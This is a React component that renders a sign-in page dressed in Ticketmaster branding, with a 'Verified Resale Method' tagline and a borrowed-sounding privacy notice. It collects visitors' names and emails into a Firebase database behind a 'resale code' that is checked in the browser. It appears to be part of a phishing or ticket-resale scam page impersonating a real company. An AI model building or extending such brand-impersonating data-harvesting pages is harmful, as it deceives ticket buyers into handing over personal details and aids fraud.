import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ref, onValue, push } from 'firebase/database';
import { db } from '../../firebase';

function Access({ setAccessGranted }) {
  const [userCode, setUserCode] = useState('');
  const [storedCode, setStoredCode] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const returnPath = location.state?.returnPath || '/';
  const [userName, setUserName] = useState('');
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    const codeRef = ref(db, 'codes/code');
    const unsubscribe = onValue(codeRef, (snapshot) => {
      const code = snapshot.val();
      setStoredCode(code);
    });

    return () => unsubscribe();
  }, []);

  const handleSubmit = () => {
    if (userCode === storedCode) {
      const usersRef = ref(db, 'usersd');
      const newUser = {
        name: userName,
        email: userEmail,
        timestamp: Date.now()
      };

      push(usersRef, newUser)
        .then(() => {
          setAccessGranted(true);
          navigate(returnPath);
        })
        .catch((error) => {
          console.error('Error saving user data:', error);
          alert('Something went wrong. Please try again.');
        });
    } else {
      alert('Invalid code. Please try again.');
    }
  };

  return (
    <div className="flex flex-col items-center justify-center bg-white from-blue-100 to-white px-4">
      <div className="mb-20 text-center relative -translate-y-6">
        <h1 className="text-5xl font-extrabold italic text-blue-700 mt-14 leading-none tracking-tight">
          Ticketmaster<sup className="text-sm align-top">®</sup>
        </h1>
        <p className="text-sm font-bold italic text-blue-600 mt-1 -mb-10">
          Verified Resale Method
        </p>
      </div>
      <div className="flex flex-col w-full max-w-md px-6 py-8 bg-white shadow-lg rounded-xl transition-all duration-300">
        <h2 className="text-xl font-bold text-gray-800 mb-1 uppercase">Sign in your Ticketmaster account</h2>
        <p className="text-gray-600 text-sm mb-6">
          If you don’t have an account you will be prompted to create one.
        </p>

        <label htmlFor="userName" className="text-sm font-medium text-gray-700 mb-1">Name</label>
        <input
          id="userName"
          type="text"
          value={userName}
          onChange={(e) => setUserName(e.target.value)}
          className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
        />

        <label htmlFor="userEmail" className="text-sm font-medium text-gray-700 mb-1">Email</label>
        <input
          id="userEmail"
          type="email"
          value={userEmail}
          onChange={(e) => setUserEmail(e.target.value)}
          className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
        />

        <label htmlFor="userCode" className="text-sm font-medium text-gray-700 mb-1">Verified Resale Code</label>
        <input
          id="userCode"
          type="password"
          value={userCode}
          onChange={(e) => setUserCode(e.target.value)}
          className="border border-gray-300 px-4 py-2 mb-4 rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
        />

        <div className="flex justify-end">
          <button
            onClick={handleSubmit}
            className="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-3 py-1 rounded-md shadow transition duration-200 text-sm"
          >
            Sign in
          </button>
        </div>

        <p className="text-xs text-gray-500 mt-6">
          As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
        </p>
      </div>
    </div>
  );
}

export default Access;
